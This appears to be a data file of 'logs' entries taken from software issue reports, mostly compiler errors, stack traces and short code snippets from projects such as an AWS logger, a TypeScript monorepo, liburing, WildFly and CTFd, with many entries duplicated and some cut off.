        "logs": "```\r\n        private static readonly DateTime MIN_TIMESTAMP_UTC_KIND = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);\r\n\r\n        /// <summary>\r\n        /// Last time an error message was registered due to overflowing in-memory buffer.\r\n        /// </summary>\r\n        private DateTime _maxBufferTimeStamp = MIN_TIMESTAMP_UTC_KIND;\r\n\r\n        /// <summary>\r\n        /// Minimum interval in minutes between two error messages on in-memory buffer overflow.\r\n        /// </summary>\r\n        const double MAX_BUFFER_TIMEDIFF = 5;\r\n"
    },
    {
        "logs": "```\r\n        private void AddSingleMessage(string message, DateTime? timestamp)\r\n        {\r\n            DateTime timestampNn = timestamp ?? DateTime.Now;\r\n\r\n            if (_pendingMessageQueue.Count > _config.MaxQueuedMessages)\r\n            {\r\n                if (_maxBufferTimeStamp.AddMinutes(MAX_BUFFER_TIMEDIFF) < DateTime.UtcNow)\r\n                {\r\n                    if (_maxBufferTimeStamp == MIN_TIMESTAMP_UTC_KIND)\r\n                    {\r\n                        string errorMessage = $\"The AWS Logger in-memory buffer has reached maximum capacity of {_config.MaxQueuedMessages:N0} entries. Currently contains {_pendingMessageQueue.Count:N0} entries.\";\r\n                        LogLibraryServiceError(new System.InvalidOperationException(message));\r\n                        _pendingMessageQueue.Enqueue(new InputLogEvent\r\n                        {\r\n                            Timestamp = timestampNn,\r\n                            Message = errorMessage\r\n                        });\r\n                    }\r\n                    _maxBufferTimeStamp = DateTime.UtcNow;\r\n                }\r\n            }\r\n\r\n            _pendingMessageQueue.Enqueue(new InputLogEvent\r\n            {\r\n                Timestamp = timestampNn,\r\n                Message = message,\r\n            });\r\n        }\r\n"
    },
    {
        "logs": "`ts\r\n    For._(\"dividend\", success(42))\r\n       ._(\"divisor\", success(2))\r\n       ._(\"divisorVerified\", ({divisor}) => divisor != 0 ? success(divisor) : failure(\"Divisor must not be zero!\"))\r\n       .yield(({dividend, divisorVerified}) => dividend / divisorVerified)\r\n"
    },
    {
        "logs": "`\r\nnode_modules/@types/node/index.d.ts(76,13): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\nnode_modules/wix-react-tools/dist/src/core/dev-mode.d.ts(2,11): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\n"
    },
    {
        "logs": "```\r\nnode_modules/@types/node/index.d.ts(76,13): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\nnode_modules/wix-react-tools/dist/src/core/dev-mode.d.ts(2,11): error TS2451: Cannot redeclare block-scoped variable 'process'.\r\n"
    },
    {
        "logs": "`computing information gain\r\nTraceback (most recent call last):\r\n  File \"/home/motaz/tmp/langid.py/langid/train/IGweight.py\", line 246, in <module>\r\n    ig = compute_IG(bucketlist, features, dist, args.binarize, suffix, args.jobs)\r\n  File \"/home/motaz/tmp/langid.py/langid/train/IGweight.py\", line 164, in compute_IG\r\n    for i, (t, w) in enumerate(pass_IG_out):\r\n  File \"/usr/lib/python2.7/multiprocessing/pool.py\", line 668, in next\r\n    raise value\r\nIndexError: only integers, slices ("
    },
    {
        "logs": "`\r\n$ snap run atom\r\nln: failed to create symbolic link '/home/ghislain/snap/atom/46/.config/gtk-2.0/gtkfilechooser.ini': File exists\r\n/usr/share/themes/Ambiance/gtk-2.0/apps/mate-panel.rc:30: error: invalid string constant \"murrine-scrollbar\", expected valid string constant\r\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\n"
    },
    {
        "logs": "```\r\n$ snap run atom\r\nln: failed to create symbolic link '/home/ghislain/snap/atom/46/.config/gtk-2.0/gtkfilechooser.ini': File exists\r\n/usr/share/themes/Ambiance/gtk-2.0/apps/mate-panel.rc:30: error: invalid string constant \"murrine-scrollbar\", expected valid string constant\r\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\n"
    },
    {
        "logs": "`\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n"
    },
    {
        "logs": "`\r\n[10:24:52 AM] Starting compilation in watch mode...\r\n\r\n[10:24:52 AM] Projects in this build:\r\n    * packages/d/tsconfig.json\r\n    * packages/b/tsconfig.json\r\n    * packages/c/tsconfig.json\r\n    * tsconfig.json\r\n\r\n[10:24:52 AM] Project 'packages/d/tsconfig.json' is up to date because newest input 'packages/d/src/d.ts' is older than oldest output 'packages/d/lib/d.js.map'\r\n\r\n[10:24:52 AM] Project 'packages/b/tsconfig.json' is out of date because output file 'packages/b/lib/B.js' does not exist\r\n\r\n[10:24:52 AM] Building project 'c:/temp/typescript-monorepo/packages/b/tsconfig.json'...\r\n\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n\r\n[10:24:56 AM] Project 'packages/c/tsconfig.json' is up to date because newest input 'packages/c/src/index.ts' is older than oldest output 'packages/c/lib/index.js'\r\n\r\n[10:24:56 AM] Found 1 error. Watching for file changes.\r\n"
    },
    {
        "logs": "```\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n"
    },
    {
        "logs": "```\r\n[10:24:52 AM] Starting compilation in watch mode...\r\n\r\n[10:24:52 AM] Projects in this build:\r\n    * packages/d/tsconfig.json\r\n    * packages/b/tsconfig.json\r\n    * packages/c/tsconfig.json\r\n    * tsconfig.json\r\n\r\n[10:24:52 AM] Project 'packages/d/tsconfig.json' is up to date because newest input 'packages/d/src/d.ts' is older than oldest output 'packages/d/lib/d.js.map'\r\n\r\n[10:24:52 AM] Project 'packages/b/tsconfig.json' is out of date because output file 'packages/b/lib/B.js' does not exist\r\n\r\n[10:24:52 AM] Building project 'c:/temp/typescript-monorepo/packages/b/tsconfig.json'...\r\n\r\npackages/b/src/B.tsx:5:1 - error TS2362: The left-hand side of an arithmetic operation must be of type 'any', 'number', 'bigint' or an enum type.\r\n\r\n5 \"\" / 0;\r\n  ~~\r\n\r\n[10:24:56 AM] Project 'packages/c/tsconfig.json' is up to date because newest input 'packages/c/src/index.ts' is older than oldest output 'packages/c/lib/index.js'\r\n\r\n[10:24:56 AM] Found 1 error. Watching for file changes.\r\n"
    },
    {
        "logs": "`\r\na.ts:4:3 - error TS2345: Argument of type '{ prop1: number; prop2: number; prop3: number; test(): void; accept_foo(foo: Foo): boolean; }' is not assignable to parameter of type 'Foo'.\r\n  Object literal may only specify known properties, and 'prop1' does not exist in type 'Foo'.\r\n\r\n4   prop1: 1,\r\n    ~~~~~~~~\r\n\r\n\r\nFound 1 error.\r\n"
    },
    {
        "logs": "`\r\njava.util.ConcurrentModificationException\r\n    at java.util.TreeMap.callMappingFunctionWithCheck (TreeMap.java:742)\r\n    at java.util.TreeMap.computeIfAbsent (TreeMap.java:558)\r\n    at aQute.bnd.osgi.Jar.putResource (Jar.java:288)\r\n    at aQute.bnd.osgi.Jar$1.visitFile (Jar.java:202)\r\n    at aQute.bnd.osgi.Jar$1.visitFile (Jar.java:177)\r\n    at java.nio.file.Files.walkFileTree (Files.java:2804)\r\n    at aQute.bnd.osgi.Jar.buildFromDirectory (Jar.java:176)\r\n    at aQute.bnd.osgi.Jar.<init> (Jar.java:119)\r\n    at aQute.bnd.osgi.Jar.<init> (Jar.java:148)\r\n    at aQute.bnd.osgi.Analyzer.addClasspath (Analyzer.java:2490)\r\n    at aQute.bnd.maven.plugin.BndMavenPlugin.execute (BndMavenPlugin.java:200)\r\n    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:137)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:210)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)\r\n    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)\r\n    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:81)\r\n    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:56)\r\n    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:128)\r\n    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:305)\r\n    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:192)\r\n    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:105)\r\n    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:957)\r\n    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:289)\r\n    at org.apache.maven.cli.MavenCli.main (MavenCli.java:193)\r\n    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)\r\n    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:64)\r\n    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)\r\n    at java.lang.reflect.Method.invoke (Method.java:564)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:282)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:225)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:406)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:347)\r\n"
    },
    {
        "logs": "```\r\njava.util.ConcurrentModificationException\r\n    at java.util.TreeMap.callMappingFunctionWithCheck (TreeMap.java:742)\r\n    at java.util.TreeMap.computeIfAbsent (TreeMap.java:558)\r\n    at aQute.bnd.osgi.Jar.putResource (Jar.java:288)\r\n    at aQute.bnd.osgi.Jar$1.visitFile (Jar.java:202)\r\n    at aQute.bnd.osgi.Jar$1.visitFile (Jar.java:177)\r\n    at java.nio.file.Files.walkFileTree (Files.java:2804)\r\n    at aQute.bnd.osgi.Jar.buildFromDirectory (Jar.java:176)\r\n    at aQute.bnd.osgi.Jar.<init> (Jar.java:119)\r\n    at aQute.bnd.osgi.Jar.<init> (Jar.java:148)\r\n    at aQute.bnd.osgi.Analyzer.addClasspath (Analyzer.java:2490)\r\n    at aQute.bnd.maven.plugin.BndMavenPlugin.execute (BndMavenPlugin.java:200)\r\n    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:137)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:210)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:156)\r\n    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:148)\r\n    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:117)\r\n    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:81)\r\n    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:56)\r\n    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:128)\r\n    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:305)\r\n    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:192)\r\n    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:105)\r\n    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:957)\r\n    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:289)\r\n    at org.apache.maven.cli.MavenCli.main (MavenCli.java:193)\r\n    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)\r\n    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:64)\r\n    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)\r\n    at java.lang.reflect.Method.invoke (Method.java:564)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:282)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:225)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:406)\r\n    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:347)\r\n"
    },
    {
        "logs": "`\r\ndouble-poll-crash.c:69: warning: \"__NR_io_uring_setup\" redefined\r\n   69 | #define __NR_io_uring_setup 425\r\n      |\r\nIn file included from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd.h:27,\r\n                 from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/sys/syscall.h:24,\r\n                 from double-poll-crash.c:12:\r\n/nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd-common.h:382: note: this is the location of the previous definition\r\n  382 | #define __NR_io_uring_setup (__NR_SYSCALL_BASE + 425)\r\n      |\r\ndouble-poll-crash.c: In function 'main':\r\ndouble-poll-crash.c:153:11: error: '__NR_mmap' undeclared (first use in this function)\r\n  153 |   syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);\r\n      |           ^~~~~~~~~\r\ndouble-poll-crash.c:153:11: note: each undeclared identifier is reported only once for each function it appears in\r\nmake[1]: *** [Makefile:144: double-poll-crash] Error 1\r\nmake[1]: Leaving directory '/build/liburing/test'\r\nmake: *** [Makefile:13: all] Error 2\r\nbuilder for '/nix/store/2z8qpmjia5jq1nibw83k9jv2xj7xhcwa-liburing-2.0.drv' failed with exit code 2\r\n"
    },
    {
        "logs": "```\r\ndouble-poll-crash.c:69: warning: \"__NR_io_uring_setup\" redefined\r\n   69 | #define __NR_io_uring_setup 425\r\n      |\r\nIn file included from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd.h:27,\r\n                 from /nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/sys/syscall.h:24,\r\n                 from double-poll-crash.c:12:\r\n/nix/store/83q8jcps9kqg0w7bnf9ddyyh9jx3ac5l-glibc-2.32-40-dev/include/asm/unistd-common.h:382: note: this is the location of the previous definition\r\n  382 | #define __NR_io_uring_setup (__NR_SYSCALL_BASE + 425)\r\n      |\r\ndouble-poll-crash.c: In function 'main':\r\ndouble-poll-crash.c:153:11: error: '__NR_mmap' undeclared (first use in this function)\r\n  153 |   syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);\r\n      |           ^~~~~~~~~\r\ndouble-poll-crash.c:153:11: note: each undeclared identifier is reported only once for each function it appears in\r\nmake[1]: *** [Makefile:144: double-poll-crash] Error 1\r\nmake[1]: Leaving directory '/build/liburing/test'\r\nmake: *** [Makefile:13: all] Error 2\r\nbuilder for '/nix/store/2z8qpmjia5jq1nibw83k9jv2xj7xhcwa-liburing-2.0.drv' failed with exit code 2\r\n"
    },
    {
        "logs": "`\r\n(node:6690) [DEP0128] DeprecationWarning: Invalid 'main' field in '<REDACTED>/node_modules/mpbasic/package.json' of '/index.js'. Please either fix that or report it to the module author\r\n(Use "
    },
    {
        "logs": "`\r\n[snip]\r\n  File \"__init__.pxd\", line 155, in init msmtools.estimation.dense.mle_trev_given_pi (msmtools/estimation/dense/mle_trev_given_pi.c:4431)\r\nValueError: numpy.dtype has the wrong size, try recompiling\r\n"
    },
    {
        "logs": "```\r\n[snip]\r\n  File \"__init__.pxd\", line 155, in init msmtools.estimation.dense.mle_trev_given_pi (msmtools/estimation/dense/mle_trev_given_pi.c:4431)\r\nValueError: numpy.dtype has the wrong size, try recompiling\r\n"
    },
    {
        "logs": "`\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nWrapped exception:\r\nFailed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"}\r\nError: /Stage[main]/Wildfly_wrapper::Config/Wildfly::Datasources::Driver[postgresql-9.2-XA]/Wildfly::Util::Resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/Wildfly_resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/ensure: change from absent to present failed: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"db2\"}],\"operation\":\"add\",\"driver-name\":\"db2\",\"driver-module-name\":\"com.ibm.db2\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"com.ibm.db2.jcc.DB2Driver\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\n"
    },
    {
        "logs": "```\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nWrapped exception:\r\nFailed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"}\r\nError: /Stage[main]/Wildfly_wrapper::Config/Wildfly::Datasources::Driver[postgresql-9.2-XA]/Wildfly::Util::Resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/Wildfly_resource[/subsystem=datasources/jdbc-driver=postgresqlXa]/ensure: change from absent to present failed: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"postgresqlXa\"}],\"operation\":\"add\",\"driver-name\":\"postgresqlXa\",\"driver-module-name\":\"org.postgresql\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"org.postgresql.xa.PGXADataSource\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\nError: Could not set 'present' on ensure: Failed with: WFLYJCA0034: Unable to instantiate driver class \"undef\". See log (WARN) for more details for {\"address\":[{\"subsystem\":\"datasources\"},{\"jdbc-driver\":\"db2\"}],\"operation\":\"add\",\"driver-name\":\"db2\",\"driver-module-name\":\"com.ibm.db2\",\"driver-class-name\":\"undef\",\"driver-xa-datasource-class-name\":\"com.ibm.db2.jcc.DB2Driver\"} at 16:/modules/wildfly/manifests/util/resource.pp\r\n"
    },
    {
        "logs": "`python\r\ng.Vertex(\"Humphrey Bogart\").All()\r\n---------------------------------------------------------------------------\r\nTypeError                                 Traceback (most recent call last)\r\n<ipython-input-18-5ec9876cb5d1> in <module>()\r\n----> 1 g.Vertex(\"Humphrey Bogart\").All()\r\n\r\n/home/hurbina/src/pyley/pyley/__init__.py in Vertex(self, *node_ids)\r\n     76             return self.V()\r\n     77 \r\n---> 78         return self.V(node_ids)\r\n     79 \r\n     80     def Morphism(self):\r\n\r\n/home/hurbina/src/pyley/pyley/__init__.py in V(self, *node_ids)\r\n     60         for index, node_id in enumerate(node_ids):\r\n     61             if index == l - 1:\r\n---> 62                 builder.append(u\"'{0:s}'\".format(node_id))\r\n     63             else:\r\n     64                 builder.append(u\"'{0:s}',\".format(node_id))\r\n\r\nTypeError: non-empty format string passed to object.__format__\r\n"
    },
    {
        "logs": "` plugin that Cruise Control depends on. This plugin seems to require the existence of a git directory for versioning (see the [code](https://github.com/username_2/gradle-semantic-build-versioning/blob/master/src/main/groovy/net/username_2/gradle/versioning/VersionUtils.groovy)). \r\n\r\n1. We filed a ticket regarding this issue in here https://github.com/username_2/gradle-semantic-build-versioning/issues/99.\r\n2. In the meantime, you may either explicitly run "
    },
    {
        "logs": "```\n<issue_comment>username_1: Hi @username_0 ,\r\nThanks for reporting this!\r\nIt seems to be an issue with the `gradle-semantic-build-versioning` plugin that Cruise Control depends on. This plugin seems to require the existence of a git directory for versioning (see the [code](https://github.com/username_2/gradle-semantic-build-versioning/blob/master/src/main/groovy/net/username_2/gradle/versioning/VersionUtils.groovy)). \r\n\r\n1. We filed a ticket regarding this issue in here https://github.com/username_2/gradle-semantic-build-versioning/issues/99.\r\n2. In the meantime, you may either explicitly run `git init` after extracting the `zip` / `tar.gz` file downloaded from the releases, or `git clone` the repository directly.\r\n\r\n-- Also note that [LinkedIn's official JFrog repository](https://linkedin.jfrog.io/linkedin/) has the Cruise Control artifacts starting version `0.0.3`.<issue_closed>\n<issue_comment>username_0: @username_1 I can build 0.0.3, when I run:\r\n"
    },
    {
        "logs": "`\r\nusing GooglePlayGames;\r\nusing GooglePlayGames.BasicApi;\r\nusing UnityEngine;\r\n\r\n       /// <summary>\r\n        /// Authorization with Google Play Services;\r\n        /// </summary>\r\n        private void LoginWithGooglePlayServices()\r\n        {\r\n            PlayGamesClientConfiguration config = new PlayGamesClientConfiguration.Builder()\r\n                // requests a server auth code be generated so it can be passed to an\r\n                //  associated back end server application and exchanged for an OAuth token.\r\n                .RequestServerAuthCode(false)\r\n                .Build();\r\n            PlayGamesPlatform.DebugLogEnabled = true;\r\n            PlayGamesPlatform.InitializeInstance(config);\r\n            PlayGamesPlatform.Activate();\r\n\r\n            PlayGamesPlatform.Instance.Authenticate(GplaySignInCallback, false);\r\n            \r\n        }\r\n\r\n        /// <summary>\r\n        /// UI Google Play Services handler;\r\n        /// </summary>\r\n        /// <param name=\"success\"></param>\r\n        private void GplaySignInCallback(bool success)\r\n        {\r\n            Debug.Log(\"!!!!!!!!!!!!!!!!!!!!!!!!! GplaySignInCallback PlayGamesPlatform.Instance.GetServerAuthCode()=\" \r\n                      + PlayGamesPlatform.Instance.GetServerAuthCode());\r\n            Debug.Log(\"!!!!!!!!!!!!!!!!!!!!!!!!! PlayGamesPlatform.Instance.localUser.authenticated = \"\r\n                      + PlayGamesPlatform.Instance.localUser.authenticated.ToString());\r\n            \r\n            if (success)\r\n            {\r\n                SignInSuccessHandler(PlatformTypes.GOOGLE_ACCOUNT, PlayGamesPlatform.Instance.localUser.id,\r\n                    PlayGamesPlatform.Instance.GetServerAuthCode());\r\n            }\r\n            else\r\n            {\r\n                SignInSuccessHandler(PlatformTypes.ANDROID_ADVERT, _advId, string.Empty);\r\n            }\r\n        }\r\n"
    },
    {
        "logs": "`OperationalError: (pymysql.err.OperationalError) (1045, u\"Access denied for user 'root'@'localhost' (using password: NO)\") (Background on this error at: http://sqlalche.me/e/e3q8)"
    },
    {
        "logs": "`[root@localhost CTFd]# gunicorn --bind 0.0.0.0:8009 -w 1 \"CTFd:create_app()\"\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Starting gunicorn 19.7.1\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Listening at: http://0.0.0.0:8009 (3562)\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Using worker: sync\r\n[2018-06-22 14:19:06 +0000] [3567] [INFO] Booting worker with pid: 3567\r\n[2018-06-22 14:19:06 +0000] [3567] [ERROR] Exception in worker process\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/arbiter.py\", line 578, in spawn_worker\r\n    worker.init_process()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/workers/base.py\", line 126, in init_process\r\n    self.load_wsgi()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/workers/base.py\", line 135, in load_wsgi\r\n    self.wsgi = self.app.wsgi()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/base.py\", line 67, in wsgi\r\n    self.callable = self.load()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py\", line 65, in load\r\n    return self.load_wsgiapp()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py\", line 52, in load_wsgiapp\r\n    return util.import_app(self.app_uri)\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/util.py\", line 364, in import_app\r\n    app = eval(obj, vars(mod))\r\n  File \"<string>\", line 1, in <module>\r\n  File \"/root/CTFd/CTFd/__init__.py\", line 103, in create_app\r\n    if not database_exists(url):\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy_utils/functions/database.py\", line 477, in database_exists\r\n    return bool(get_scalar_result(engine, text))\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy_utils/functions/database.py\", line 455, in get_scalar_result\r\n    result_proxy = engine.execute(sql)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2074, in execute\r\n    connection = self.contextual_connect(close_with_result=True)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2123, in contextual_connect\r\n    self._wrap_pool_connect(self.pool.connect, None),\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2162, in _wrap_pool_connect\r\n    e, dialect, self)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 1476, in _handle_dbapi_exception_noconnection\r\n    exc_info\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/util/compat.py\", line 203, in raise_from_cause\r\n    reraise(type(exception), exception, tb=exc_tb, cause=cause)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2158, in _wrap_pool_connect\r\n    return fn()\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 403, in connect\r\n    return _ConnectionFairy._checkout(self)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 782, in _checkout\r\n    fairy = _ConnectionRecord.checkout(pool)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 532, in checkout\r\n[Truncated]\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/default.py\", line 410, in connect\r\n    return self.dbapi.connect(*cargs, **cparams)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/__init__.py\", line 90, in Connect\r\n    return Connection(*args, **kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 699, in __init__\r\n    self.connect()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 936, in connect\r\n    self._request_authentication()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 1156, in _request_authentication\r\n    auth_packet = self._read_packet()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 1018, in _read_packet\r\n    packet.check_error()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 384, in check_error\r\n    err.raise_mysql_exception(self._data)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/err.py\", line 107, in raise_mysql_exception\r\n    raise errorclass(errno, errval)\r\nOperationalError: (pymysql.err.OperationalError) (1045, u\"Access denied for user 'root'@'localhost' (using password: NO)\") (Background on this error at: http://sqlalche.me/e/e3q8)\r\n[2018-06-22 14:19:06 +0000] [3567] [INFO] Worker exiting (pid: 